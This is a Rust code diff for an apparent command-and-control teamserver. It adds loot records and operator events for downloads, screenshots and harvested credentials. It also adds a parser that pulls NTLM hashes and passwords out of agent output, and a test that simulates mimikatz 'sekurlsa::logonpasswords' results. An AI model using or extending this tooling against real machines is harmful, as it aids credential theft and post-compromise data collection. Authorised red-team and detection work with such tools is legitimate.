@@ -49,6 +49,21 @@ struct DownloadState {
     started_at: String,
 }
 
+#[derive(Clone, Debug, Default, PartialEq, Eq)]
+struct LootContext {
+    operator: String,
+    command_line: String,
+    task_id: String,
+    queued_at: String,
+}
+
+#[derive(Clone, Debug, PartialEq, Eq)]
+struct CredentialCapture {
+    label: String,
+    content: String,
+    pattern: &'static str,
+}
+
 #[derive(Clone, Copy)]
 struct BuiltinDispatchContext<'a> {
     registry: &'a AgentRegistry,
@@ -181,15 +196,17 @@ impl CommandDispatcher {
         let fs_database = database.clone();
         let fs_events = events.clone();
         let fs_downloads = downloads.clone();
+        let fs_registry = registry.clone();
         dispatcher.register_handler(
             u32::from(DemonCommand::CommandFs),
             move |agent_id, request_id, payload| {
+                let registry = fs_registry.clone();
                 let database = fs_database.clone();
                 let events = fs_events.clone();
                 let downloads = fs_downloads.clone();
                 Box::pin(async move {
                     handle_filesystem_callback(
-                        &database, &events, &downloads, agent_id, request_id, &payload,
+                        &registry, &database, &events, &downloads, agent_id, request_id, &payload,
                     )
                     .await
                 })
@@ -220,13 +237,19 @@ impl CommandDispatcher {
 
         let command_output_events = events.clone();
         let command_output_plugins = plugins.clone();
+        let command_output_database = database.clone();
+        let command_output_registry = registry.clone();
         dispatcher.register_handler(
             u32::from(DemonCommand::CommandOutput),
             move |agent_id, request_id, payload| {
+                let registry = command_output_registry.clone();
+                let database = command_output_database.clone();
                 let events = command_output_events.clone();
                 let plugins = command_output_plugins.clone();
                 Box::pin(async move {
                     handle_command_output_callback(
+                        &registry,
+                        &database,
                         &events,
                         plugins.as_ref(),
                         agent_id,
@@ -241,15 +264,17 @@ impl CommandDispatcher {
         let beacon_database = database.clone();
         let beacon_events = events.clone();
         let beacon_downloads = downloads.clone();
+        let beacon_registry = registry.clone();
         dispatcher.register_handler(
             u32::from(DemonCommand::BeaconOutput),
             move |agent_id, request_id, payload| {
+                let registry = beacon_registry.clone();
                 let database = beacon_database.clone();
                 let events = beacon_events.clone();
                 let downloads = beacon_downloads.clone();
                 Box::pin(async move {
                     handle_beacon_output_callback(
-                        &database, &events, &downloads, agent_id, request_id, &payload,
+                        &registry, &database, &events, &downloads, agent_id, request_id, &payload,
                     )
                     .await
                 })
@@ -269,14 +294,18 @@ impl CommandDispatcher {
 
         let screenshot_database = database.clone();
         let screenshot_events = events.clone();
+        let screenshot_registry = registry.clone();
         dispatcher.register_handler(
             u32::from(DemonCommand::CommandScreenshot),
             move |agent_id, request_id, payload| {
+                let registry = screenshot_registry.clone();
                 let database = screenshot_database.clone();
                 let events = screenshot_events.clone();
                 Box::pin(async move {
-                    handle_screenshot_callback(&database, &events, agent_id, request_id, &payload)
-                        .await
+                    handle_screenshot_callback(
+                        &registry, &database, &events, agent_id, request_id, &payload,
+                    )
+                    .await
                 })
             },
         );
@@ -640,6 +669,7 @@ async fn dispatch_builtin_package(
     }
     if command_id == u32::from(DemonCommand::CommandFs) {
         return handle_filesystem_callback(
+            context.registry,
             context.database,
             context.events,
             context.downloads,
@@ -658,6 +688,8 @@ async fn dispatch_builtin_package(
     }
     if command_id == u32::from(DemonCommand::CommandOutput) {
         return handle_command_output_callback(
+            context.registry,
+            context.database,
             context.events,
             context.plugins,
             agent_id,
@@ -668,6 +700,7 @@ async fn dispatch_builtin_package(
     }
     if command_id == u32::from(DemonCommand::BeaconOutput) {
         return handle_beacon_output_callback(
+            context.registry,
             context.database,
             context.events,
             context.downloads,
@@ -686,6 +719,7 @@ async fn dispatch_builtin_package(
     }
     if command_id == u32::from(DemonCommand::CommandScreenshot) {
         return handle_screenshot_callback(
+            context.registry,
             context.database,
             context.events,
             agent_id,
@@ -744,7 +778,297 @@ impl DownloadTracker {
     }
 }
 
+async fn loot_context(registry: &AgentRegistry, agent_id: u32, request_id: u32) -> LootContext {
+    registry
+        .request_context(agent_id, request_id)
+        .await
+        .map(|context| LootContext {
+            operator: context.operator,
+            command_line: context.command_line,
+            task_id: context.task_id,
+            queued_at: context.created_at,
+        })
+        .unwrap_or_default()
+}
+
+async fn insert_loot_record(
+    database: &Database,
+    loot: LootRecord,
+) -> Result<LootRecord, CommandDispatchError> {
+    let id = database.loot().create(&loot).await?;
+    Ok(LootRecord { id: Some(id), ..loot })
+}
+
+fn loot_new_event(
+    loot: &LootRecord,
+    command_id: u32,
+    request_id: u32,
+    context: &LootContext,
+) -> Result<OperatorMessage, CommandDispatchError> {
+    let mut extra = BTreeMap::from([
+        ("MiscType".to_owned(), Value::String("loot-new".to_owned())),
+        ("LootID".to_owned(), Value::String(loot.id.unwrap_or_default().to_string())),
+        ("LootKind".to_owned(), Value::String(loot.kind.clone())),
+        ("LootName".to_owned(), Value::String(loot.name.clone())),
+        ("CapturedAt".to_owned(), Value::String(loot.captured_at.clone())),
+    ]);
+
+    if let Some(path) = &loot.file_path {
+        extra.insert("FilePath".to_owned(), Value::String(path.clone()));
+    }
+    if let Some(size_bytes) = loot.size_bytes {
+        extra.insert("SizeBytes".to_owned(), Value::String(size_bytes.to_string()));
+    }
+    if !context.operator.is_empty() {
+        extra.insert("Operator".to_owned(), Value::String(context.operator.clone()));
+    }
+    if !context.command_line.is_empty() {
+        extra.insert("CommandLine".to_owned(), Value::String(context.command_line.clone()));
+    }
+    if !context.task_id.is_empty() {
+        extra.insert("TaskID".to_owned(), Value::String(context.task_id.clone()));
+    }
+
+    agent_response_event_with_extra(
+        loot.agent_id,
+        command_id,
+        request_id,
+        "Info",
+        &format!("New loot captured: {} ({})", loot.name, loot.kind),
+        extra,
+        String::new(),
+    )
+}
+
+fn metadata_with_context(
+    entries: impl IntoIterator<Item = (String, Value)>,
+    context: &LootContext,
+) -> Value {
+    let mut metadata = serde_json::Map::new();
+    for (key, value) in entries {
+        metadata.insert(key, value);
+    }
+    if !context.operator.is_empty() {
+        metadata.insert("operator".to_owned(), Value::String(context.operator.clone()));
+    }
+    if !context.command_line.is_empty() {
+        metadata.insert("command_line".to_owned(), Value::String(context.command_line.clone()));
+    }
+    if !context.task_id.is_empty() {
+        metadata.insert("task_id".to_owned(), Value::String(context.task_id.clone()));
+    }
+    if !context.queued_at.is_empty() {
+        metadata.insert("queued_at".to_owned(), Value::String(context.queued_at.clone()));
+    }
+    Value::Object(metadata)
+}
+
+fn broadcast_credential_event(
+    events: &EventBus,
+    agent_id: u32,
+    credential: &CredentialCapture,
+    context: &LootContext,
+) -> Result<(), CommandDispatchError> {
+    let timestamp = OffsetDateTime::now_utc().format(&Rfc3339)?;
+    let mut fields = BTreeMap::from([
+        ("DemonID".to_owned(), Value::String(format!("{agent_id:08X}"))),
+        ("Name".to_owned(), Value::String(credential.label.clone())),
+        ("Credential".to_owned(), Value::String(credential.content.clone())),
+        ("Pattern".to_owned(), Value::String(credential.pattern.to_owned())),
+    ]);
+
+    if !context.operator.is_empty() {
+        fields.insert("Operator".to_owned(), Value::String(context.operator.clone()));
+    }
+    if !context.command_line.is_empty() {
+        fields.insert("CommandLine".to_owned(), Value::String(context.command_line.clone()));
+    }
+    if !context.task_id.is_empty() {
+        fields.insert("TaskID".to_owned(), Value::String(context.task_id.clone()));
+    }
+
+    events.broadcast(OperatorMessage::CredentialsAdd(Message {
+        head: MessageHead {
+            event: EventCode::Credentials,
+            user: "teamserver".to_owned(),
+            timestamp,
+            one_time: String::new(),
+        },
+        info: red_cell_common::operator::FlatInfo { fields },
+    }));
+    Ok(())
+}
+
+fn extract_credentials(output: &str) -> Vec<CredentialCapture> {
+    let mut captures = Vec::new();
+    let mut current_block = Vec::new();
+
+    for raw_line in output.lines() {
+        let line = raw_line.trim();
+        if line.is_empty() {
+            if !current_block.is_empty() {
+                captures.push(CredentialCapture {
+                    label: "credential-block".to_owned(),
+                    content: current_block.join("\n"),
+                    pattern: "keyword-block",
+                });
+                current_block.clear();
+            }
+            continue;
+        }
+
+        if looks_like_pwdump_hash(line) {
+            if !current_block.is_empty() {
+                captures.push(CredentialCapture {
+                    label: "credential-block".to_owned(),
+                    content: current_block.join("\n"),
+                    pattern: "keyword-block",
+                });
+                current_block.clear();
+            }
+            captures.push(CredentialCapture {
+                label: "password-hash".to_owned(),
+                content: line.to_owned(),
+                pattern: "pwdump-hash",
+            });
+            continue;
+        }
+
+        if looks_like_inline_secret(line) {
+            if !current_block.is_empty() {
+                captures.push(CredentialCapture {
+                    label: "credential-block".to_owned(),
+                    content: current_block.join("\n"),
+                    pattern: "keyword-block",
+                });
+                current_block.clear();
+            }
+            captures.push(CredentialCapture {
+                label: "inline-credential".to_owned(),
+                content: line.to_owned(),
+                pattern: "inline-secret",
+            });
+            continue;
+        }
+
+        if looks_like_credential_line(line) {
+            current_block.push(line.to_owned());
+            continue;
+        }
+
+        if !current_block.is_empty() {
+            captures.push(CredentialCapture {
+                label: "credential-block".to_owned(),
+                content: current_block.join("\n"),
+                pattern: "keyword-block",
+            });
+            current_block.clear();
+        }
+    }
+
+    if !current_block.is_empty() {
+        captures.push(CredentialCapture {
+            label: "credential-block".to_owned(),
+            content: current_block.join("\n"),
+            pattern: "keyword-block",
+        });
+    }
+
+    let mut deduped = Vec::new();
+    for capture in captures {
+        if !deduped.iter().any(|existing: &CredentialCapture| existing.content == capture.content) {
+            deduped.push(capture);
+        }
+    }
+    deduped
+}
+
+fn looks_like_credential_line(line: &str) -> bool {
+    let lower = line.to_ascii_lowercase();
+    let separators = [":", "="];
+    separators.iter().any(|separator| {
+        line.split_once(separator).is_some_and(|(key, value)| {
+            let key = key.trim().to_ascii_lowercase();
+            let value = value.trim();
+            !value.is_empty()
+                && [
+                    "user", "username", "login", "domain", "password", "pass", "secret", "hash",
+                    "ntlm", "lm", "ticket", "cred",
+                ]
+                .iter()
+                .any(|keyword| key.contains(keyword) || lower.contains(keyword))
+        })
+    })
+}
+
+fn looks_like_inline_secret(line: &str) -> bool {
+    if line.contains("://") || line.contains('\\') && !line.contains(':') {
+        return false;
+    }
+
+    line.split_once(':').is_some_and(|(left, right)| {
+        let left = left.trim();
+        let right = right.trim();
+        !left.is_empty()
+            && !right.is_empty()
+            && !left.contains(' ')
+            && !right.contains(' ')
+            && (left.contains('\\') || left.contains('@') || right.len() >= 8)
+    })
+}
+
+fn looks_like_pwdump_hash(line: &str) -> bool {
+    let parts = line.split(':').collect::<Vec<_>>();
+    parts.len() >= 6
+        && parts[0].chars().all(|char| char.is_ascii_graphic())
+        && parts[2].len() == 32
+        && parts[3].len() == 32
+        && parts[2].chars().all(|char| char.is_ascii_hexdigit())
+        && parts[3].chars().all(|char| char.is_ascii_hexdigit())
+}
+
+async fn persist_credentials_from_output(
+    database: &Database,
+    events: &EventBus,
+    agent_id: u32,
+    command_id: u32,
+    request_id: u32,
+    output: &str,
+    context: &LootContext,
+) -> Result<(), CommandDispatchError> {
+    for (index, credential) in extract_credentials(output).into_iter().enumerate() {
+        let captured_at = OffsetDateTime::now_utc().format(&Rfc3339)?;
+        let record = insert_loot_record(
+            database,
+            LootRecord {
+                id: None,
+                agent_id,
+                kind: "credential".to_owned(),
+                name: format!("credential-{request_id:X}-{}", index + 1),
+                file_path: None,
+                size_bytes: Some(i64::try_from(credential.content.len()).unwrap_or_default()),
+                captured_at,
+                data: Some(credential.content.as_bytes().to_vec()),
+                metadata: Some(metadata_with_context(
+                    [
+                        ("pattern".to_owned(), Value::String(credential.pattern.to_owned())),
+                        ("request_id".to_owned(), Value::String(format!("{request_id:X}"))),
+                    ],
+                    context,
+                )),
+            },
+        )
+        .await?;
+        events.broadcast(loot_new_event(&record, command_id, request_id, context)?);
+        broadcast_credential_event(events, agent_id, &credential, context)?;
+    }
+
+    Ok(())
+}
+
 async fn handle_command_output_callback(
+    registry: &AgentRegistry,
+    database: &Database,
     events: &EventBus,
     plugins: Option<&PluginRuntime>,
     agent_id: u32,
@@ -756,6 +1080,7 @@ async fn handle_command_output_callback(
     if output.is_empty() {
         return Ok(None);
     }
+    let context = loot_context(registry, agent_id, request_id).await;
 
     events.broadcast(agent_response_event(
         agent_id,
@@ -765,6 +1090,16 @@ async fn handle_command_output_callback(
         &format!("Received Output [{} bytes]:", output.len()),
         Some(output.clone()),
     )?);
+    persist_credentials_from_output(
+        database,
+        events,
+        agent_id,
+        u32::from(DemonCommand::CommandOutput),
+        request_id,
+        &output,
+        &context,
+    )
+    .await?;
     if let Some(plugins) = plugins
         && let Err(error) = plugins
             .emit_command_output(
@@ -781,6 +1116,7 @@ async fn handle_command_output_callback(
 }
 
 async fn handle_beacon_output_callback(
+    registry: &AgentRegistry,
     database: &Database,
     events: &EventBus,
     downloads: &DownloadTracker,
@@ -790,6 +1126,7 @@ async fn handle_beacon_output_callback(
 ) -> Result<Option<Vec<u8>>, CommandDispatchError> {
     let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::BeaconOutput));
     let callback = parser.read_u32("beacon callback type")?;
+    let context = loot_context(registry, agent_id, request_id).await;
 
     match DemonCallback::try_from(callback).map_err(|error| {
         CommandDispatchError::InvalidCallbackPayload {
@@ -806,8 +1143,18 @@ async fn handle_beacon_output_callback(
                     request_id,
                     "Good",
                     &format!("Received Output [{} bytes]:", output.len()),
-                    Some(output),
+                    Some(output.clone()),
                 )?);
+                persist_credentials_from_output(
+                    database,
+                    events,
+                    agent_id,
+                    u32::from(DemonCommand::BeaconOutput),
+                    request_id,
+                    &output,
+                    &context,
+                )
+                .await?;
             }
         }
         DemonCallback::OutputOem | DemonCallback::OutputUtf8 => {
@@ -819,8 +1166,18 @@ async fn handle_beacon_output_callback(
                     request_id,
                     "Good",
                     &format!("Received Output [{} bytes]:", output.len()),
-                    Some(output),
+                    Some(output.clone()),
                 )?);
+                persist_credentials_from_output(
+                    database,
+                    events,
+                    agent_id,
+                    u32::from(DemonCommand::BeaconOutput),
+                    request_id,
+                    &output,
+                    &context,
+                )
+                .await?;
             }
         }
         DemonCallback::ErrorMessage => {
@@ -832,8 +1189,18 @@ async fn handle_beacon_output_callback(
                     request_id,
                     "Error",
                     &format!("Received Output [{} bytes]:", output.len()),
-                    Some(output),
+                    Some(output.clone()),
                 )?);
+                persist_credentials_from_output(
+                    database,
+                    events,
+                    agent_id,
+                    u32::from(DemonCommand::BeaconOutput),
+                    request_id,
+                    &output,
+                    &context,
+                )
+                .await?;
             }
         }
         DemonCallback::File => {
@@ -884,7 +1251,14 @@ async fn handle_beacon_output_callback(
             let bytes = parser.read_bytes("beacon file close")?;
             let file_id = parse_file_close(u32::from(DemonCommand::BeaconOutput), &bytes)?;
             if let Some(state) = downloads.finish(agent_id, file_id).await {
-                persist_download(database, agent_id, file_id, &state).await?;
+                let record =
+                    persist_download(database, agent_id, file_id, &state, &context).await?;
+                events.broadcast(loot_new_event(
+                    &record,
+                    u32::from(DemonCommand::BeaconOutput),
+                    state.request_id,
+                    &context,
+                )?);
                 events.broadcast(download_complete_event(
                     agent_id,
                     u32::from(DemonCommand::BeaconOutput),
@@ -900,6 +1274,7 @@ async fn handle_beacon_output_callback(
 }
 
 async fn handle_filesystem_callback(
+    registry: &AgentRegistry,
     database: &Database,
     events: &EventBus,
     downloads: &DownloadTracker,
@@ -909,6 +1284,7 @@ async fn handle_filesystem_callback(
 ) -> Result<Option<Vec<u8>>, CommandDispatchError> {
     let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandFs));
     let subcommand = parser.read_u32("filesystem subcommand")?;
+    let context = loot_context(registry, agent_id, request_id).await;
     let subcommand = DemonFilesystemCommand::try_from(subcommand).map_err(|error| {
         CommandDispatchError::InvalidCallbackPayload {
             command_id: u32::from(DemonCommand::CommandFs),
@@ -1090,7 +1466,15 @@ async fn handle_filesystem_callback(
                     let reason = parser.read_u32("filesystem download close reason")?;
                     if let Some(state) = downloads.finish(agent_id, file_id).await {
                         if reason == 0 {
-                            persist_download(database, agent_id, file_id, &state).await?;
+                            let record =
+                                persist_download(database, agent_id, file_id, &state, &context)
+                                    .await?;
+                            events.broadcast(loot_new_event(
+                                &record,
+                                u32::from(DemonCommand::CommandFs),
+                                state.request_id,
+                                &context,
+                            )?);
                             events.broadcast(download_complete_event(
                                 agent_id,
                                 u32::from(DemonCommand::CommandFs),
@@ -1285,7 +1669,8 @@ async fn persist_download(
     agent_id: u32,
     file_id: u32,
     state: &DownloadState,
-) -> Result<(), CommandDispatchError> {
+    context: &LootContext,
+) -> Result<LootRecord, CommandDispatchError> {
     let name = state
         .remote_path
         .replace('\\', "/")
@@ -1294,9 +1679,9 @@ async fn persist_download(
         .unwrap_or(state.remote_path.as_str())
         .trim_end_matches('\0')
         .to_owned();
-    database
-        .loot()
-        .create(&LootRecord {
+    insert_loot_record(
+        database,
+        LootRecord {
             id: None,
             agent_id,
             kind: "download".to_owned(),
@@ -1305,19 +1690,19 @@ async fn persist_download(
             size_bytes: Some(i64::try_from(state.data.len()).unwrap_or_default()),
             captured_at: OffsetDateTime::now_utc().format(&Rfc3339)?,
             data: Some(state.data.clone()),
-            metadata: Some(Value::Object(
+            metadata: Some(metadata_with_context(
                 [
                     ("file_id".to_owned(), Value::String(format!("{file_id:08X}"))),
                     ("request_id".to_owned(), Value::String(format!("{:X}", state.request_id))),
                     ("expected_size".to_owned(), Value::String(state.expected_size.to_string())),
                     ("started_at".to_owned(), Value::String(state.started_at.clone())),
                 ]
-                .into_iter()
-                .collect(),
+                .into_iter(),
+                context,
             )),
-        })
-        .await?;
-    Ok(())
+        },
+    )
+    .await
 }
 
 fn download_progress_event(
@@ -1592,6 +1977,7 @@ async fn handle_token_callback(
 }
 
 async fn handle_screenshot_callback(
+    registry: &AgentRegistry,
     database: &Database,
     events: &EventBus,
     agent_id: u32,
@@ -1600,6 +1986,7 @@ async fn handle_screenshot_callback(
 ) -> Result<Option<Vec<u8>>, CommandDispatchError> {
     let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandScreenshot));
     let success = parser.read_u32("screenshot success")?;
+    let context = loot_context(registry, agent_id, request_id).await;
 
     if success == 0 {
         events.broadcast(agent_response_event(
@@ -1640,9 +2027,9 @@ async fn handle_screenshot_callback(
         )
         .map_err(CommandDispatchError::Timestamp)?;
 
-    database
-        .loot()
-        .create(&LootRecord {
+    let record = insert_loot_record(
+        database,
+        LootRecord {
             id: None,
             agent_id,
             kind: "screenshot".to_owned(),
@@ -1651,16 +2038,24 @@ async fn handle_screenshot_callback(
             size_bytes: Some(i64::try_from(bytes.len()).unwrap_or_default()),
             captured_at: captured_at.clone(),
             data: Some(bytes.clone()),
-            metadata: Some(Value::Object(
+            metadata: Some(metadata_with_context(
                 [
                     ("request_id".to_owned(), Value::String(format!("{request_id:X}"))),
                     ("captured_at".to_owned(), Value::String(captured_at.clone())),
                 ]
-                .into_iter()
-                .collect(),
+                .into_iter(),
+                &context,
             )),
-        })
-        .await?;
+        },
+    )
+    .await?;
+
+    events.broadcast(loot_new_event(
+        &record,
+        u32::from(DemonCommand::CommandScreenshot),
+        request_id,
+        &context,
+    )?);
 
     events.broadcast(agent_response_event_with_extra(
         agent_id,
@@ -2672,6 +3067,7 @@ mod tests {
                     command_line: "sleep 10".to_owned(),
                     task_id: "task-41".to_owned(),
                     created_at: "2026-03-09T20:10:00Z".to_owned(),
+                    operator: "operator".to_owned(),
                 },
             )
             .await?;
@@ -2729,6 +3125,7 @@ mod tests {
                     command_line: "sleep 5".to_owned(),
                     task_id: "task-77".to_owned(),
                     created_at: "2026-03-09T20:12:00Z".to_owned(),
+                    operator: "operator".to_owned(),
                 },
             )
             .await?;
@@ -2975,6 +3372,96 @@ mod tests {
     }
 
     #[tokio::test]
+    async fn builtin_command_output_handler_captures_credentials_and_broadcasts_loot()
+    -> Result<(), Box<dyn std::error::Error>> {
+        let database = Database::connect_in_memory().await?;
+        let registry = AgentRegistry::new(database.clone());
+        let events = EventBus::default();
+        let mut receiver = events.subscribe();
+        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
+        registry
+            .insert(sample_agent_info(
+                0xABCD_EE01,
+                [0x11; AGENT_KEY_LENGTH],
+                [0x22; AGENT_IV_LENGTH],
+            ))
+            .await?;
+        registry
+            .enqueue_job(
+                0xABCD_EE01,
+                Job {
+                    command: u32::from(DemonCommand::CommandOutput),
+                    request_id: 0x66,
+                    payload: Vec::new(),
+                    command_line: "sekurlsa::logonpasswords".to_owned(),
+                    task_id: "66".to_owned(),
+                    created_at: "2026-03-10T10:00:00Z".to_owned(),
+                    operator: "operator".to_owned(),
+                },
+            )
+            .await?;
+        let dispatcher = CommandDispatcher::with_builtin_handlers(
+            registry,
+            events,
+            database.clone(),
+            sockets,
+            None,
+        );
+
+        let mut payload = Vec::new();
+        add_bytes(&mut payload, b"Username : alice\nPassword : Sup3rSecret!\nDomain   : LAB");
+        dispatcher
+            .dispatch(0xABCD_EE01, u32::from(DemonCommand::CommandOutput), 0x66, &payload)
+            .await?;
+
+        let first = receiver.recv().await.ok_or("missing output event")?;
+        let second = receiver.recv().await.ok_or("missing loot event")?;
+        let third = receiver.recv().await.ok_or("missing credential event")?;
+
+        let OperatorMessage::AgentResponse(output_message) = first else {
+            panic!("expected command output response");
+        };
+        assert_eq!(
+            output_message.info.extra.get("Message"),
+            Some(&Value::String("Received Output [55 bytes]:".to_owned()))
+        );
+
+        let OperatorMessage::AgentResponse(loot_message) = second else {
+            panic!("expected loot-new response");
+        };
+        assert_eq!(
+            loot_message.info.extra.get("MiscType"),
+            Some(&Value::String("loot-new".to_owned()))
+        );
+        assert_eq!(
+            loot_message.info.extra.get("Operator"),
+            Some(&Value::String("operator".to_owned()))
+        );
+
+        let OperatorMessage::CredentialsAdd(credentials) = third else {
+            panic!("expected credentials event");
+        };
+        assert_eq!(
+            credentials.info.fields.get("CommandLine"),
+            Some(&Value::String("sekurlsa::logonpasswords".to_owned()))
+        );
+
+        let loot = database.loot().list_for_agent(0xABCD_EE01).await?;
+        assert_eq!(loot.len(), 3);
+        assert!(loot.iter().all(|entry| entry.kind == "credential"));
+        assert!(
+            loot.iter().any(|entry| {
+                entry.data.as_deref() == Some(b"Password : Sup3rSecret!".as_slice())
+            })
+        );
+        assert!(loot.iter().all(|entry| {
+            entry.metadata.as_ref().and_then(|value| value.get("operator"))
+                == Some(&Value::String("operator".to_owned()))
+        }));
+        Ok(())
+    }
+
+    #[tokio::test]
     async fn builtin_screenshot_handler_persists_loot_and_broadcasts_misc_fields()
     -> Result<(), Box<dyn std::error::Error>> {
         let database = Database::connect_in_memory().await?;
@@ -3014,8 +3501,16 @@ mod tests {
         assert_eq!(loot[0].kind, "screenshot");
         assert_eq!(loot[0].data.as_deref(), Some(png.as_slice()));
 
+        let loot_event = receiver.recv().await.ok_or_else(|| "loot event missing".to_owned())?;
         let event =
             receiver.recv().await.ok_or_else(|| "screenshot response missing".to_owned())?;
+        let OperatorMessage::AgentResponse(loot_message) = loot_event else {
+            panic!("expected screenshot loot event");
+        };
+        assert_eq!(
+            loot_message.info.extra.get("MiscType"),
+            Some(&Value::String("loot-new".to_owned()))
+        );
         let OperatorMessage::AgentResponse(message) = event else {
             panic!("expected screenshot agent response event");
         };
@@ -3081,7 +3576,8 @@ mod tests {
 
         let first = receiver.recv().await.ok_or("missing open event")?;
         let second = receiver.recv().await.ok_or("missing progress event")?;
-        let third = receiver.recv().await.ok_or("missing completion event")?;
+        let third = receiver.recv().await.ok_or("missing loot event")?;
+        let fourth = receiver.recv().await.ok_or("missing completion event")?;
 
         let OperatorMessage::AgentResponse(open_message) = first else {
             panic!("expected download open response");
@@ -3099,7 +3595,15 @@ mod tests {
             Some(&Value::String(content.len().to_string()))
         );
 
-        let OperatorMessage::AgentResponse(done_message) = third else {
+        let OperatorMessage::AgentResponse(loot_message) = third else {
+            panic!("expected loot event");
+        };
+        assert_eq!(
+            loot_message.info.extra.get("MiscType"),
+            Some(&Value::String("loot-new".to_owned()))
+        );
+
+        let OperatorMessage::AgentResponse(done_message) = fourth else {
             panic!("expected download completion response");
         };
         assert_eq!(
@@ -3176,7 +3680,15 @@ mod tests {
 
         let _ = receiver.recv().await.ok_or("missing beacon open event")?;
         let _ = receiver.recv().await.ok_or("missing beacon progress event")?;
+        let loot_event = receiver.recv().await.ok_or("missing beacon loot event")?;
         let final_event = receiver.recv().await.ok_or("missing beacon completion event")?;
+        let OperatorMessage::AgentResponse(loot_message) = loot_event else {
+            panic!("expected beacon file loot event");
+        };
+        assert_eq!(
+            loot_message.info.extra.get("MiscType"),
+            Some(&Value::String("loot-new".to_owned()))
+        );
         let OperatorMessage::AgentResponse(message) = final_event else {
             panic!("expected beacon file completion response");
         };
